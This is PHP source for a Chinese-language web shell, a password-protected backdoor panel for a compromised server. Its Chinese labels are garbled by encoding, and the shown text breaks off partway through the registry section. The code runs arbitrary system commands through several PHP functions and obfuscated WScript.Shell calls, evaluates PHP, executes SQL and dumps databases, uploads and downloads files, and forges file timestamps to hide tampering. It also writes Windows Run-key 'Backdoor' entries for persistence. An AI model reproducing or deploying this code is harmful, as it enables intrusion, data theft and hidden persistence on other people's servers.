<?php
error_reporting(7);
ob_start();
session_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
/*===================== �������� =====================*/
$admin['check'] = "1";
$admin['pass']  = "5c73bc611706f235d53f4c19d61fa5b0";
$retime = "no";
$cmd = "cmd.exe";
$notice = "webshell";
/*===================== ���ý��� =====================*/
// ��������� register_globals = off �Ļ����¹���
$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');

if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];
$dis_func = get_cfg_var("disable_functions");


/*===================== �����֤ =====================*/
if($admin['check'] == "1") {
	if ($_GET['action'] == "logout") {
		unset($_SESSION['adminpass'])	;
		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
		echo "<span style=\"font-size: 12px; font-family: Verdana\">ע���ɹ�......<p><a href=\"".$self."\">������Զ��˳��򵥻������˳�������� &gt;&gt;&gt;</a></span>";
		exit;
	}

	if ($_POST['do'] == 'login') {
		$thepass=trim($_POST['adminpass']);
		$thepass=md5($thepass);
		if ($admin['pass'] == $thepass) {
			$_SESSION['adminpass']='hack';
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">��½�ɹ�......<p><a href=\"".$self."\">������Զ���ת�򵥻�������������� &gt;&gt;&gt;</a></span>";
			exit;
		}
	}
	if (isset($_SESSION['adminpass'])) {
		if ($_SESSION['adminpass'] != 'hack') {
			loginpage();
		}
	} else {
		loginpage();
	}
}
/*===================== ��֤���� =====================*/

// �ж� magic_quotes_gpc ״̬
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

// �鿴PHPINFO
if ($_GET['action'] == "phpinfo") {
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() �����ѱ�����,��鿴&lt;PHP��������&gt;";
	exit;
}
if($_GET['action'] == "nowuser") {
$user = get_current_user();
if(!$user) $user = "���泤�٣�������̬���޷���ȡ��ǰ�����û�����";
echo"��ǰ�����û�����$user";
exit;
}


// �����ļ�
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('��Ҫ�µ��ļ�������!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}

// ֱ�����ر������ݿ�
if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
	@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");	
	$table = array_flip($_POST['table']);
	$result = mysql_query("SHOW tables");
	echo ($result) ? NULL : "����: ".mysql_error();

	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata.= sqldumptable($currow[0]);
			$mysqldata.= $mysqldata."\r\n";
		}
	}
	mysql_close();
	exit;
}

// ����Ŀ¼
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// ��ȡ��ǰ·��
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// �ж϶�д���
$dir_writeable = (dir_writeable($nowpath)) ? "��д" : "����д";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">ע������</a>" : "";

$tb = new FORMS;

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>http://<? echo $_SERVER['HTTP_HOST'];?>php</title>
<style type="text/css">
body{
	BACKGROUND-COLOR: #F5F5F5; 
	COLOR: #3F3849; 
	font-family: "Verdana", "Tahoma", "����";
	font-size: "12px";
	line-height: "140%";
}

TD		{FONT-FAMILY: "Verdana", "Tahoma", "����"; FONT-SIZE: 12px; line-height: 140%;}
.smlfont {
	font-family: "Verdana", "Tahoma", "����";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
	padding-left: "2px";
}
.redfont {
	COLOR: "#CA0000";
}
A:LINK		{COLOR: #3F3849; TEXT-DECORATION: none}
A:VISITED	{COLOR: #3F3849; TEXT-DECORATION: none}
A:HOVER		{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
A:ACTIVE	{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}
.top {BACKGROUND-COLOR: "#CCCCCC"}
.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT>
</head>
<body style="table-layout:fixed; word-break:break-all">
<center>
<?php
$test = "";
if(!$_GET['dir']) $dir = "./";
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="center">'.date("Y��m��d�� h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody('| <a href="?action=logout">ע����¼</a> | <a href="?action=dir">Shell Ŀ¼</a> | <a href="?action=phpenv">��������</a> |  <a href="?action=shell">WebShell</a> | ');
$tb->tdbody('| <a href="?action=downloads">Http �ļ�����</a> | <a href="?action=search&dir='.$dir.'">�ļ�����</a> | <a href="?action=eval">ִ��php�ű�</a> | <a href="?action=sql">ִ��SQL���</a> | <a href="?action=sql&type=fun">Func����Shell</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="?action=SUExp">Serv-U EXP</a> |');
$tb->tablefooter();
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?
$tb->headerform(array('method'=>'GET','content'=>'<p>����·��: '.$pathname.'<br>��ǰĿ¼('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>��תĿ¼: '.$tb->makeinput('dir').' '.$tb->makeinput('','ȷ��','','submit').' ��֧�־���·�������·����'));

$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'�ϴ��ļ�����ǰĿ¼: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','ȷ��','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));

$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'�½��ļ��ڵ�ǰĿ¼: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','ȷ��','','submit')));

$tb->headerform(array('content'=>'�½�Ŀ¼�ڵ�ǰĿ¼: '.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','ȷ��','','submit')));
?>
</table>
<hr width="775" noshade>
<?php
/*===================== ִ�в��� ��ʼ =====================*/
echo "<p><b>\n";
// ɾ���ļ�
if (!empty($delfile)) {
	if (file_exists($delfile)) {
		echo (@unlink($delfile)) ? $delfile." ɾ���ɹ�!" : "�ļ�ɾ��ʧ��!";
	} else {
		echo basename($delfile)." �ļ��Ѳ�����!";
	}
}

// ɾ��Ŀ¼
elseif (!empty($deldir)) {
	$deldirs="$dir/$deldir";
	if (!file_exists("$deldirs")) {
		echo "$deldir Ŀ¼�Ѳ�����!";
	} else {
		echo (deltree($deldirs)) ? "Ŀ¼ɾ���ɹ�!" : "Ŀ¼ɾ��ʧ��!";
	}
}

// ����Ŀ¼
elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) {
			echo "��Ŀ¼�Ѵ���!";
		} else {
			echo (@mkdir("$mkdirs",0777)) ? "����Ŀ¼�ɹ�!" : "����ʧ��!";
			@chmod("$mkdirs",0777);
		}
	}
}

// �ϴ��ļ�
elseif ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "�ϴ��ɹ�!" : "�ϴ�ʧ��!";
}

// �༭�ļ�
elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
    if(!file_exists($editfilename)) unset($retime);
	if($time==$now) $time = @filemtime($editfilename);
        $time2 = @date("Y-m-d H:i:s",$time);
		$filename="$editfilename";
		@$fp=fopen("$filename","w");
		
		$filecontent = $_POST['filecontent'];

		echo $msg=@fwrite($fp,$filecontent) ? "д���ļ��ɹ�!" : "д��ʧ��!";
		@fclose($fp);
		if($retime=="yes"){
        echo"&nbsp;�Զ�����:";
        echo $msg=@touch($filename,$time) ? "�޸��ļ�Ϊ".$time2."�ɹ�!" : "�޸��ļ�ʱ��ʧ��!";
		}
	} else {
		echo "��������Ҫ�༭���ļ���!";
	}
}
//�ļ�����
elseif ($_POST['do'] == 'downloads') {
	$contents = @file_get_contents($_POST['durl']);
	if(!$contents){
	echo"�޷���ȡҪ���ص�����";
	}
	elseif(file_exists($path)){
	echo"�ܱ�Ǹ���ļ�".$path."�Ѿ������ˣ�����������ļ�����";
	}else{
    $fp = @fopen($path,"w");
	echo $msg=@fwrite($fp,$contents) ? "�����ļ��ɹ�!" : "�����ļ�д��ʱʧ��!";
	@fclose($fp);
	}
}

// �༭�ļ�����
elseif ($_POST['do'] == 'editfileperm') {
	if (!empty($_POST['fileperm'])) {
		$fileperm=base_convert($_POST['fileperm'],8,10);
		echo (@chmod($dir."/".$file,$fileperm)) ? "�����޸ĳɹ�!" : "�޸�ʧ��!";
		echo " �ļ� ".$file." �޸ĺ������Ϊ: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
	} else {
		echo "��������Ҫ���õ�����!";
	}
}

// �ļ�����
elseif ($_POST['do'] == 'rename') {
	if (!empty($_POST['newname'])) {
		$newname=$_POST['dir']."/".$_POST['newname'];
		if (@file_exists($newname)) {
			echo "".$_POST['newname']." �Ѿ�����,����������һ��!";
		} else {
			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." �ɹ�����Ϊ ".$_POST['newname']." !" : "�ļ����޸�ʧ��!";
		}
	} else {
		echo "��������Ҫ�ĵ��ļ���!";
	}
}
elseif ($_POST['do'] == 'search') {
if(!empty($oldkey)){
echo"<span class=\"redfont\">���ҹؼ���:[".$oldkey."],������ʾ���ҵĽ��:";
	if($type2 == "getpath"){
	echo"����Ƶ�����ļ��ϻ��в��ֽ�ȡ��ʾ.";
}
echo"</span><br><hr width=\"775\" noshade>";
find($path);
}else{
echo"��Ҫ��ʲô��?";
}
}

// ��¡ʱ��
elseif ($_POST['do'] == 'domodtime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "Ҫ�޸ĵ��ļ�������!";
	} else {
		if (!@file_exists($_POST['tarfile'])) {
			echo "Ҫ���յ��ļ�������!";
		} else {
			$time=@filemtime($_POST['tarfile']);
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ���޸�ʱ��ɹ���Ϊ ".date("Y-m-d H:i:s",$time)." !" : "�ļ����޸�ʱ���޸�ʧ��!";
		}
	}
}

// �Զ���ʱ��
elseif ($_POST['do'] == 'modmytime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "Ҫ�޸ĵ��ļ�������!";
	} else {
		$year=$_POST['year'];
		$month=$_POST['month'];
		$data=$_POST['data'];		
		$hour=$_POST['hour'];
		$minute=$_POST['minute'];
		$second=$_POST['second'];
		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
			$time=strtotime("$data $month $year $hour:$minute:$second");
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." ���޸�ʱ��ɹ���Ϊ ".date("Y-m-d H:i:s",$time)." !" : "�ļ����޸�ʱ���޸�ʧ��!";
		}
	}
}

// ����MYSQL
elseif ($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "���ݿ����ӳɹ�!";
		mysql_close();
	} else {
		echo mysql_error();
	}
}

// ִ��SQL���
elseif ($_POST['do'] == 'query') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
	@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");
	$result = @mysql_query($_POST['sql_query']);
	echo ($result) ? "SQL���ɹ�ִ��!" : "����: ".mysql_error();
	mysql_close();
}

// ���ݲ���
elseif ($_POST['do'] == 'backupmysql') {
	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
		echo "��ѡ�������ݵ����ݱ�ͱ��ݷ�ʽ!";
	} else {
		if ($_POST['backuptype'] == 'server') {
			@mysql_connect($servername,$dbusername,$dbpassword) or die("���ݿ�����ʧ��");
			@mysql_select_db($dbname) or die("ѡ�����ݿ�ʧ��");	
			$table = array_flip($_POST['table']);
			$filehandle = @fopen($path,"w");
			if ($filehandle) {
				$result = mysql_query("SHOW tables");
				echo ($result) ? NULL : "����: ".mysql_error();
				while ($currow = mysql_fetch_array($result)) {
					if (isset($table[$currow[0]])) {
						sqldumptable($currow[0], $filehandle);
						fwrite($filehandle,"\n\n\n");
					}
				}
				fclose($filehandle);
				echo "���ݿ��ѳɹ����ݵ� <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
				mysql_close();
			} else {
				echo "����ʧ��,��ȷ��Ŀ���ļ����Ƿ���п�дȨ��!";
			}
		}
	}
}

// ������� PS:�ļ�̫����ܷǳ���
// Thx : С��
elseif($downrar) {
	if (!empty($dl)) {
		$dfiles="";
		foreach ($dl AS $filepath=>$value) {
			$dfiles.=$filepath.",";
		}
		$dfiles=substr($dfiles,0,strlen($dfiles)-1);
		$dl=explode(",",$dfiles);
		$zip=new PHPZip($dl);
		$code=$zip->out;		
		header("Content-type: application/octet-stream");
		header("Accept-Ranges: bytes");
		header("Accept-Length: ".strlen($code));
		header("Content-Disposition: attachment;filename=".$_SERVER['HTTP_HOST']."_Files.tar.gz");
		echo $code;
		exit;
	} else {
		echo "��ѡ��Ҫ������ص��ļ�!";
	}
}

// Shell.Application ���г���
elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
	$shell= new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
	$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
	echo ($a=='0') ? "�����Ѿ��ɹ�ִ��!" : "��������ʧ��!";
}

// �鿴PHP���ò���״��
elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
	echo "���ò��� ".$_POST['phpvarname']." �����: ".getphpcfg($_POST['phpvarname'])."";
}

// ��ȡע���
elseif(($regread) AND !empty($_POST['readregname'])) {
	$shell= new COM('WSc'.'rip'.'t.Sh'.'ell');
	var_dump(@$shell->RegRead($_POST['readregname']));
}

// д��ע���
elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
	$shell= new COM('W'.'Scr'.'ipt.S'.'hell');
	$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
	echo ($a=='0') ? "д��ע���ֵ�ɹ�!" : "д�� ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." ʧ��!";
}

// ɾ��ע���
elseif(($regdelete) AND !empty($_POST['delregname'])) {
	$shell= new COM('WS'.'cri'.'pt.S'.'he'.'ll');
	$a = @$shell->RegDelete($_POST['delregname']);
	echo ($a=='0') ? "ɾ��ע���ֵ�ɹ�!" : "ɾ�� ".$_POST['delregname']." ʧ��!";
}

else {
	echo "$notice";
}

echo "</b></p>\n";
/*===================== ִ�в��� ���� =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
	$tb->tableheader();
?>
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="27%"><b>�ļ�</b></td>
	<td align="center" nowrap width="16%"><b>��������</b></td>
    <td align="center" nowrap width="16%"><b>����޸�</b></td>
    <td align="center" nowrap width="11%"><b>��С</b></td>
    <td align="center" nowrap width="6%"><b>����</b></td>
    <td align="center" nowrap width="24%"><b>����</b></td>
  </tr>
<?php
// Ŀ¼�б�
$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap>| <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','��ȷ��Ҫɾ�� $file Ŀ¼��? \\n\\n�����Ŀ¼�ǿ�,�˴β�������ɾ����Ŀ¼�µ������ļ�!','1')\">ɾ��</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($file)."\">����</a> |</td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">�����ϼ�Ŀ¼</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}// while
@closedir($dirs); 
?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<FORM action="" method="POST">
<?
// �ļ��б�
$dirs=@opendir($dir);
$file_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){		
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		if (@filectime($filepath) == @filemtime($filepath)) {
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		} else {
			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
		}
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\">";
		echo "<INPUT type=checkbox value=1 name=dl[$filepath]>";
		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">����</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">�༭</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','��ȷ��Ҫɾ�� $file �ļ���?','2')\">ɾ��</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">����</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">ʱ��</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}// while
@closedir($dirs); 
$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','ѡ���ļ��������','','submit').'</td><td align="right">'.$dir_i.' ��Ŀ¼ / '.$file_i.' ���ļ�</td></tr></table>','center',getrowbg(),'','','6');

echo "</FORM>\n";
echo "</table>\n";
}// end dir

elseif ($_GET['action'] == "editfile") {
	if(empty($newfile)) {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
	$tb->tableheader();
	$tb->formheader($action,'�½�/�༭�ļ�');
	$tb->tdbody('��ǰ�ļ�: '.$tb->makeinput('editfilename',$filename).' �������ļ����������ļ� Php�������: <input type="checkbox" name="change" value="yes" onclick="javascript:alert(\'�������ֻ�����������ܻ���ѹ��������php���롣\\n\\n��php���������php�����֧��gzinflate�����벻Ҫʹ�ã�\')"> ');
	$tb->tdbody($tb->maketextarea('filecontent',$contents));
	$tb->makehidden('do','doeditfile');
	$tb->formfooter('1','30');
}//end editfile

elseif ($_GET['action'] == "rename") {
	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
	$tb->tableheader();
	$tb->formheader($action,'�޸��ļ���');
	$tb->makehidden('oldname',$dir."/".$nowfile);
	$tb->makehidden('dir',$dir);
	$tb->tdbody('��ǰ�ļ���: '.basename($nowfile));
	$tb->tdbody('����Ϊ: '.$tb->makeinput('newname'));
	$tb->makehidden('do','rename');
	$tb->formfooter('1','30');
}//end rename

elseif ($_GET['action'] == "eval") {
	$action = "?dir=".urlencode($dir)."";
	$tb->tableheader();
	$tb->formheader(''.$action.' "target="_blank' ,'ִ��php�ű�');
	$tb->tdbody($tb->maketextarea('phpcode',$contents));
	$tb->formfooter('1','30');
	
}
elseif ($_GET['action'] == "fileperm") {
	$action = "?dir=".urlencode($dir)."&file=".$file;
	$tb->tableheader();
	$tb->formheader($action,'�޸��ļ�����');
	$tb->tdbody('�޸� '.$file.' ������Ϊ: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
	$tb->makehidden('file',$file);
	$tb->makehidden('dir',urlencode($dir));
	$tb->makehidden('do','editfileperm');
	$tb->formfooter('1','30');
}//end fileperm

elseif ($_GET['action'] == "newtime") {
	$action = "?dir=".urlencode($dir);
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	$tb->tableheader();
	$tb->formheader($action,'��¡�ļ�����޸�ʱ��');
	$tb->tdbody("�޸��ļ�: ".$tb->makeinput('curfile',$file,'readonly')." �� Ŀ���ļ�: ".$tb->makeinput('tarfile','��������·�����ļ���'),'center','2','30');
	$tb->makehidden('do','domodtime');
	$tb->formfooter('','30');
	$tb->formheader($action,'�Զ����ļ�����޸�ʱ��');
	$tb->tdbody('<br><ul><li>��Ч��ʱ������ͷ�Χ�ǴӸ�������ʱ�� 1901 �� 12 �� 13 �� ������ 20:45:54 �� 2038�� 1 �� 19 �� ���ڶ� 03:14:07<br>(�����ڸ��� 32 λ�з�����������Сֵ�����ֵ����)</li><li>˵��: ��ȡ 01 �� 30 ֮��, ʱȡ 0 �� 24 ֮��, �ֺ���ȡ 0 �� 60 ֮��!</li></ul>','left');
	$tb->tdbody('��ǰ�ļ���: '.$file);
	$tb->makehidden('curfile',$file);
	$tb->tdbody('�޸�Ϊ: '.$tb->makeinput('year','1984','','text','4').' �� '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' �� '.$tb->makeinput('data','18','','text','2').' �� '.$tb->makeinput('hour','20','','text','2').' ʱ '.$tb->makeinput('minute','00','','text','2').' �� '.$tb->makeinput('second','00','','text','2').' ��','center','2','30');
	$tb->makehidden('do','modmytime');
	$tb->formfooter('1','30');
}//end newtime

elseif ($_GET['action'] == "shell") {
	$action = "??action=shell&dir=".urlencode($dir);
	$tb->tableheader();
	$tb->tdheader('WebShell Mode');
  if (substr(PHP_OS, 0, 3) == 'WIN') {
		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
		$tb->tdbody('�޻������г��� �� �ļ�: '.$tb->makeinput('program',$program).' ����: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
		$tb->makehidden('do','programrun');
		echo "</form>\n";
	}
 echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
 if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];
	$tb->tdbody('��ʾ:�������������ȫ,�����������д���ļ�.�������Եõ�ȫ������. ');
	$tb->tdbody('proc_open�������費��Ĭ�ϵ�winntϵͳ����������ʹ��,�����޸ļǵ�д�˳�,�����������������һ��δ�����Ľ���.');
	$tb->tdbody('proc_open����Ҫʹ�õ�cmd�����λ��:'.$tb->makeinput('cmd',$cmd,'','text','30').'(Ҫ����linuxϵͳ���Ǵ�����Լ��޸İ�)');
   $execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell','proc_open'=>'proc_open') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');
   $tb->tdbody('ѡ��ִ�к���: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' ��������: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
?>
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} elseif ($execfunc=="wscript") {
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} elseif($execfunc=="proc_open"){
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
if (is_resource($process)) {

    // д����
    fwrite($pipes[0], "".$_POST['command']."\r\n");
    fwrite($pipes[0], "exit\r\n");
    fclose($pipes[0]);
    // ��ȡ���
    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    while (!feof($pipes[2])) {
        echo fgets($pipes[2], 1024);
      }
    fclose($pipes[2]);

    proc_close($process);
}
		} else {
			system($_POST['command']);
		}
	}
	?></textarea></td>
  </tr>  
  </form>
</table>
<?php
}//end shell

elseif ($_GET['action'] == "reg") {
	$action = '?action=reg';
	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
	$delregname = $_POST['delregname'];
	$tb->tableheader();
	$tb->formheader($action,'��ȡע���');
	$tb->tdbody('��ֵ: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','��ȡ','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'д��ע���');
